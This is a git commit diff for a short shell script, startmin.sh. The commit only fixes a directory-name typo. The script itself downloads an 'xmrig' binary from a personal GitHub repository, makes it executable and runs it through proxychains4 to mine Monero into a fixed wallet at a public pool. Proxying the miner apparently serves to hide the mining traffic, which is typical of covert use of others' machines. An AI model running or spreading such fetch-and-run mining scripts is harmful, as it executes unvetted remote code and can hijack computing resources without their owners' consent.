afd5f88ba2bd6be2aadc8db0dc2dc9c9434b7620
duggsydaddy <32011724+duggsydaddy@users.noreply.github.com>
2021-03-04 07:04:06 +0530

    Update startmin.sh

--- startmin.sh
+++ startmin.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-cd proxychans-ng
+cd proxychains-ng
 wget https://github.com/duggsydaddy/xmrsample2/raw/main/xmrig && chmod +x xmrig && ./proxychains4 ./xmrig -o pool.minexmr.com:4444 -u 4AHcfXNosADQX5jSDTAAEXFchzZMQyxjZKSecUSPmyf6T4SzCMVkjsU8tnKiWUk1ApiwC69A1sVUHUJ5KbusHSuT8hayurp
